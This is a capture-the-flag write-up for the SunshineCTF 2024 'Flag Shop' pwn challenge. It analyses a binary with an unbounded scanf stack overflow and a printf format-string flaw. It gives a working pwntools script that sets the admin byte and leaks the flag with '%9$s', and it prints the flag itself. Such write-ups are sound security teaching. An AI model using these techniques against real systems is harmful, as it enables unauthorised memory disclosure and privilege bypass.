https://ctftime.org/event/2485

# Flag Shop (pwn)

Welcome to the SECURE shop, where your goal is to explore the platform and uncover the secrets hidden within. After creating a user account, you'll interact with different features of the system. However, the admin panel remains restricted, and your challenge is to figure out how to access it.

2024.sunshinectf.games 24001

## Analysis

`main` @ `0x16e0`
- calls `create_account` with memory from the stack
- uses `scanf("%s", local_2a)` to read 1 byte from the user
    - This allows us to supply any length payload without null bytes
    - This allows us to modify the memory passed to `create_account`
        - Notably this includes the admin flag

`create_account` @ `0x14bc`
- Reads user supplied data in a reasonable way
- Ensure that the byte at offset `0x18` is equal to zero
    - This is later checked for the value 1 to confirm the user is an admin

`load_panel` @ `0x15a1`
- Checks if the user is authorized by checking if the byte at offset `0x18` is not equal to 0
- Reads the flag into a buffer allocated on the heap
- calls `printf` on an attacker controlled format string

## Solution

1) Provide any random details for user registration
2) When selecting `1` or `load_panel` from the menu supply a payload such that
    - The first byte is `1` and we end up calling `load_panel`
    - We supply the format string `%9$s` to the `printf`
        - This allows `printf` to read the memory from the pointer on stack to heap memory which contains the flag
    - Ensure that the admin flag is set by writing `1` to the appropriate byte

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./flagshop", checksec=False)
context.binary = elf

p = remote("2024.sunshinectf.games", 24001)

p.sendline(b"smiley")
p.sendline(b"he/him")

payload = b"\x01\x00"
payload += b"A" * 8
payload += b"%9$s"
payload = payload.ljust(0x2a, b"\x01")
p.sendline(payload)

p.sendlineafter(b"1)", b"1")

p.readuntil(b"current user: ")
flag = p.readuntil(b"}").decode()

log.success(flag) # sun{c@n_st1ll_r3@d_off_the_he@p_fr0m_st@ck_po!nters!}

```

## Flag
`sun{c@n_st1ll_r3@d_off_the_he@p_fr0m_st@ck_po!nters!}`

smiley 2024/10/20
